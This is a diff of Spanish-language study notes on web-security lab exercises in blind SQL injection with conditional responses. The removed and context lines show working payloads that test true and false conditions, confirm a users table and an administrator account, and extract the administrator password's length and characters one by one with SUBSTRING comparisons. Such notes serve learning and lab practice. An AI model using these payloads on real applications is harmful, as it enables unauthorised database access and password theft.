@@ -314,7 +314,7 @@ MyDatabase     dbo           Users       Password     varchar
 	   
 		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm	* devolverá un resultado si el primer caracter del password es mayor a m
 		
-		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't	* no devuelve nada si el primer caracter del password es menor a t
+		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't	* no devuelve nada si el primer caracter del password es mayor a t
 		
 		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's	* devolverá un resultado si el primer caracter del password es igual a s
 
@@ -323,64 +323,13 @@ MyDatabase     dbo           Users       Password     varchar
 11. Lab: Blind SQL injection with conditional responses
     Laboratorio: Inyección SQL ciega con respuestas condicionales
 
-	* agregar -- or # --> tipo database, seguido de comentarios que no se visualizaran
-	
 	* identificar la cookie de seguimiento: F12, en almacenamiento, cookies, TraickingId
 		
-	   TrackingId:"Zk3DZivY4Ae3zxgy"
+	   TrackingId:"QxjjfVPHWkMCkLu5"
 
-	* utilizar BurpSuite e interceptar mensaje
-
-	* validar la tracking cookie e identifica el mensaje que agrega 
-
-	* cambiar la tracking cookie e identificar que el mensaje desaparece
-
-	* inyectar condición true --> visualizar mensajes
-		
-	   ' AND 1=1--
-
-	* inyectar condición false --> no visualizar mensajes 
-
-	   ' AND 1=2--
-
-	* confirmar si existe la tabla users.  Si cambiamos el nombre de la tabla podemos validaer otros valores
-	
-	query:
-
-	   ' AND (SELECT 'x' FROM users LIMIT 1) = 'x'--	--> si es true muestra mensaje y si es false no muestra mensaje	
-
-	* confirmar si existe username = aministrator
-	
-	query:
-
-	   ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--		--> si es true muestra mensaje y si es false no muestra mensaje	
-
-	* enumerar el tamaño de la contraseña
-
-	query, donde n es un número para iterar:
-
-	   ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH (password)>1)='administrator'--		--> si es true muestra mensaje y si es false no muestra mensaje	
-	
-	* inyectar condición para encontrar caracteres de la contraseña --> tabla users, columnas username=administrator y password
-          por cada caracter incrementar el valor de la posición en 1 
-    
-	query para acotar:
-
-	   ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'a--
-	or
-
-	   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a--	
-	
-	query para igualar:	  
-
-	   ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b--
-
-
-
-
-
-	
-
+	* consultar la cookie de seguimiento
+	   
+	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='QxjjfVPHWkMCkLu5'
 
 
 
